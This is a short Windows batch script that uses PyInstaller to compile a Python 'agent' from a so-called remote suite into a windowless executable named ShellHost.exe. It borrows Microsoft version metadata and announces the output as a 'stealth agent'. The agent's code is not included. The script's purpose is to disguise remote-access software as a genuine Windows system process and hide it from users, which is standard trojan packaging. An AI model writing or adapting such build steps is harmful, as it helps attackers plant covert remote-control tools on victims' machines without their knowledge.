@echo off
title Premium Remote Suite - EXE Builder
echo [*] Starting Agent EXE Compilation...
echo.

:: 1. Проверка PyInstaller
pyinstaller --version >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] PyInstaller not found. Installing...
    pip install pyinstaller
)

:: 2. Сборка
echo [+] Compiling agent.py to ShellHost.exe with Microsoft Metadata...
echo.
if exist ShellHost.spec del ShellHost.spec
pyinstaller --noconsole --onefile --name ShellHost --version-file version_info.txt --icon app.ico --clean agent.py

echo.
echo [+] Done! Your stealth agent is in the "dist" folder.
echo [!] Name: dist\ShellHost.exe
echo.
pause
